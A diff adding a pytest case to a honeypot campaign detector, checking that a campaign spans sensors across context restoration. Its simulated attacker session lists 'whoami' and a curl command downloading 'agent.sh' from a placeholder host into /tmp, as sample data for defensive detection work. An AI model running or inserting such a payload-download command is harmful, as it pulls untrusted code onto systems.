@@ -115,3 +115,45 @@ def test_restore_uses_latest_analysis_per_session():
 
     assert restored_ids == {"reused-session"}
     assert detector.sessions["reused-session"].source_ip == "192.0.2.30"
+
+
+def test_campaign_tracks_honeypots_across_restoration():
+    historical_event = make_session(
+        "sensor-a-session",
+        "192.0.2.40",
+        "2026-10-16T10:00:00+00:00",
+    )
+    historical_event["data"]["honeypot_id"] = "sensor-a"
+
+    detector = CampaignDetector()
+    restored_ids = restore_campaign_context(detector, [historical_event])
+
+    assert restored_ids == {"sensor-a-session"}
+    assert detector.session_honeypot_ids["sensor-a-session"] == "sensor-a"
+
+    new_session = ReconstructedSession(
+        session_id="sensor-b-session",
+        source_ip="192.0.2.40",
+        protocol="ssh",
+        client_version="SSH-2.0-TestClient",
+        hassh="test-hassh",
+        username="testuser",
+        authentication_success=False,
+        commands=[
+            "whoami",
+            "curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh",
+        ],
+        command_events=[],
+        start_time="2026-10-17T10:00:00+00:00",
+        end_time="2026-10-17T10:00:01+00:00",
+        duration_ms=1000,
+    )
+
+    campaign = detector.observe(
+        new_session,
+        intents=[],
+        honeypot_id="sensor-b",
+    )
+
+    assert campaign is not None
+    assert set(campaign.honeypot_ids) == {"sensor-a", "sensor-b"}
